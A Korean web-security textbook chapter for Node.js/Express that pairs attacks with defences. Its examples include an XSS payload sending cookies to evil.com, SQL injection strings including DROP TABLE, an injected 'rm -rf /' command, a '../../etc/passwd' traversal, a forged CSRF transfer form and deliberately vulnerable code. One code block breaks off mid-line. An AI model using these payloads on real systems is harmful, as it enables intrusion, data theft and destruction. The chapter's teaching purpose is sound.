# Chapter 26. 웹 보안 공격과 방어

## 26.1 XSS (Cross-Site Scripting)

### 공격 원리

```
악성 스크립트를 웹페이지에 삽입

예시:
게시판에 글 작성:
제목: <script>alert(document.cookie)</script>

→ 다른 사용자가 글 볼 때 스크립트 실행
→ 쿠키 탈취
```

### XSS 유형

```javascript
// 1. Stored XSS (저장형)
// DB에 악성 코드 저장
POST /api/comments
{
  "content": "<script>fetch('http://evil.com?cookie='+document.cookie)</script>"
}

// 2. Reflected XSS (반사형)
// URL 파라미터 이용
https://example.com/search?q=<script>alert('XSS')</script>

// 3. DOM-based XSS
// 클라이언트 측 JS에서 발생
document.getElementById('output').innerHTML = location.hash;
// URL: #<img src=x onerror=alert('XSS')>
```

### 방어 방법

```javascript
// 1. 입력 검증
function sanitizeInput(input) {
  return input
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;')
    .replace(/\//g, '&#x2F;');
}

// 2. DOMPurify 사용
const DOMPurify = require('dompurify');
const clean = DOMPurify.sanitize(dirtyHTML);

// 3. Content Security Policy (CSP)
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self' https://trusted.cdn.com"
  );
  next();
});

// 4. HttpOnly 쿠키
res.cookie('session', 'value', {
  httpOnly: true  // JS 접근 차단
});

// 5. 템플릿 엔진 자동 이스케이프
// EJS, Handlebars 등은 기본적으로 이스케이프
```

## 26.2 SQL Injection

### 공격 원리

```javascript
// 취약한 코드
const email = req.body.email;
const query = `SELECT * FROM users WHERE email = '${email}'`;

// 공격:
// email = "admin@example.com' OR '1'='1"

// 실행되는 쿼리:
// SELECT * FROM users WHERE email = 'admin@example.com' OR '1'='1'
// → 모든 사용자 반환!

// 더 위험한 공격:
// email = "'; DROP TABLE users; --"
// → 테이블 삭제!
```

### 방어 방법

```javascript
// 1. Parameterized Query (권장)
const query = 'SELECT * FROM users WHERE email = ?';
const result = await db.query(query, [email]);

// Sequelize ORM
const user = await User.findOne({
  where: { email: email }
});

// 2. Prepared Statement
const stmt = db.prepare('SELECT * FROM users WHERE email = ?');
stmt.run(email);

// 3. ORM 사용
// Sequelize, TypeORM 등은 자동으로 방어

// 4. 입력 검증
function validateEmail(email) {
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  return emailRegex.test(email);
}

// 5. 최소 권한 DB 계정
// 앱 계정에는 DROP, CREATE 권한 제거
```

## 26.3 CSRF (Cross-Site Request Forgery)

### 공격 원리

```
사용자가 로그인한 상태에서
악성 사이트가 대신 요청

시나리오:
1. 사용자가 bank.com 로그인 (쿠키 저장)
2. 악성 사이트 방문
3. 악성 사이트에 숨겨진 폼:
   <form action="https://bank.com/transfer" method="POST">
     <input name="to" value="공격자계좌">
     <input name="amount" value="1000000">
   </form>
   <script>document.forms[0].submit()</script>

4. 사용자 모르게 송금 요청 전송
```

### 방어 방법

```javascript
// 1. CSRF 토큰
const csrf = require('csurf');
const csrfProtection = csrf({ cookie: true });

app.use(csrfProtection);

// 폼 렌더링
app.get('/transfer', (req, res) => {
  res.render('transfer', {
    csrfToken: req.csrfToken()
  });
});

// HTML
// <input type="hidden" name="_csrf" value="{{csrfToken}}">

// 검증
app.post('/transfer', csrfProtection, (req, res) => {
  // CSRF 토큰 자동 검증
});

// 2. SameSite 쿠키
res.cookie('session', 'value', {
  sameSite: 'strict'  // 다른 사이트에서 쿠키 전송 차단
});

// 3. Referer 검증
app.use((req, res, next) => {
  const referer = req.headers.referer;
  if (referer && !referer.startsWith('https://myapp.com')) {
    return res.status(403).json({ error: 'Forbidden' });
  }
  next();
});

// 4. Custom Header (AJAX)
// X-Requested-With: XMLHttpRequest
```

## 26.4 인젝션 공격 종류

### Command Injection

```javascript
// ❌ 취약한 코드
const filename = req.body.filename;
exec(`cat ${filename}`, (err, data) => {
  res.send(data);
});

// 공격: filename = "file.txt; rm -rf /"

// ✅ 방어
const { spawn } = require('child_process');
const cat = spawn('cat', [filename]);  // 배열로 전달
```

### Path Traversal

```javascript
// ❌ 취약한 코드
const file = req.query.file;
res.sendFile(`/uploads/${file}`);

// 공격: file = "../../etc/passwd"

// ✅ 방어
const path = require('path');
const safePath = path.normalize(file).replace(/^(\.\.[\/\\])+/, '');
const fullPath = path.join(__dirname, 'uploads', safePath);

if (!fullPath.startsWith(path.join(__dirname, 'uploads'))) {
  return res.status(403).send('Forbidden');
}
```

### 취약한 세션 관리

```javascript
// ❌ 예측 가능한 세션 ID
let sessionId = 1;
function generateSessionId() {
  return sessionId++;  // 1, 2, 3, ...
}

// ✅ 안전한 세션 ID
const crypto = require('crypto');
function generateSessionId() {
  return crypto.randomBytes(32).toString('hex');
}

// ❌ 세션 만료 없음
// 세션이 영구적으로 유효

app.use(session({
```

## 26.6 보안 헤더

### helmet.js 사용

```javascript
const helmet = require('helmet');

app.use(helmet());

// 개별 설정
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    styleSrc: ["'self'", "'unsafe-inline'"],
    scriptSrc: ["'self'"],
    imgSrc: ["'self'", 'data:', 'https:'],
  }
}));

app.use(helmet.hsts({
  maxAge: 31536000,
  includeSubDomains: true,
  preload: true
}));

app.use(helmet.noSniff());  // X-Content-Type-Options
app.use(helmet.xssFilter());  // X-XSS-Protection
app.use(helmet.frameguard({ action: 'deny' }));  // X-Frame-Options
```

### 주요 헤더

```
Content-Security-Policy:
default-src 'self'
→ 리소스 로드 정책

Strict-Transport-Security:
max-age=31536000
→ HTTPS 강제

X-Content-Type-Options:
nosniff
→ MIME 타입 스니핑 방지

X-Frame-Options:
DENY
→ 클릭재킹 방어

X-XSS-Protection:
1; mode=block
→ XSS 필터 활성화
```

## 26.7 입력 검증

```javascript
// 1. 화이트리스트 방식 (권장)
const ALLOWED_ROLES = ['user', 'admin', 'moderator'];

function validateRole(role) {
  return ALLOWED_ROLES.includes(role);
}

// 2. 타입 검증
const { body, validationResult } = require('express-validator');

app.post('/api/users',
  body('email').isEmail(),
  body('age').isInt({ min: 0, max: 120 }),
  body('username').isAlphanumeric().isLength({ min: 3, max: 20 }),
  (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors: errors.array() });
    }
    // 처리
  }
);

// 3. 정규표현식
function validateUsername(username) {
  const regex = /^[a-zA-Z0-9_]{3,20}$/;
  return regex.test(username);
}

// 4. 파일 업로드 검증
const multer = require('multer');

const upload = multer({
  limits: { fileSize: 5 * 1024 * 1024 },  // 5MB
  fileFilter: (req, file, cb) => {
    const allowedTypes = ['image/jpeg', 'image/png', 'image/gif'];
    if (!allowedTypes.includes(file.mimetype)) {
      return cb(new Error('허용되지 않는 파일 타입'));
    }
    cb(null, true);
  }
});
```

## 26.8 민감 정보 노출 방지

```javascript
// ❌ 에러 메시지로 정보 노출
app.use((err, req, res, next) => {
  res.status(500).json({
    error: err.stack  // 스택 트레이스 노출!
  });
});

// ✅ 안전한 에러 처리
app.use((err, req, res, next) => {
  console.error(err.stack);  // 서버 로그에만

  if (process.env.NODE_ENV === 'production') {
    res.status(500).json({
      error: '서버 오류가 발생했습니다'
    });
  } else {
    res.status(500).json({
      error: err.message,
      stack: err.stack
    });
  }
});

// ❌ 비밀번호 반환
app.get('/api/users/:id', async (req, res) => {
  const user = await User.findByPk(req.params.id);
  res.json(user);  // password 필드 포함!
});

// ✅ 민감 정보 제외
app.get('/api/users/:id', async (req, res) => {
  const user = await User.findByPk(req.params.id, {
    attributes: { exclude: ['password', 'resetToken'] }
  });
  res.json(user);
});
```
